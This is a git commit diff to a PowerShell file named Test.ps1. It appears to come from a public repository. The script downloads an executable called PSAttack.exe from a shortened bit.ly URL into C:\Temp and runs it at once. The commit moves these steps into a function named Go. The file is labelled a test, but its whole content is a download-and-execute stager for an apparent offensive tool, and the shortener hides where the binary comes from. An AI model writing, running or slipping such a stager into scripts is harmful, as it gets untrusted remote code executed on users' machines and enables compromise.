b3a2a1c2bd1ecfad5a8503265b2f102bf4be1b0d
caabv <41907756+caabv@users.noreply.github.com>
2019-03-20 07:58:01 +0100

    Add files via upload

--- Test.ps1
+++ Test.ps1
@@ -1,3 +1,5 @@
-﻿$WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://bit.ly/2TWML79","C:\Temp\PSAttack.exe")
-& 'C:\Temp\PSAttack.exe'
+﻿function Go {
+    $WebClient = New-Object System.Net.WebClient
+    $WebClient.DownloadFile("https://bit.ly/2TWML79","C:\Temp\PSAttack.exe")
+    & 'C:\Temp\PSAttack.exe'
+}
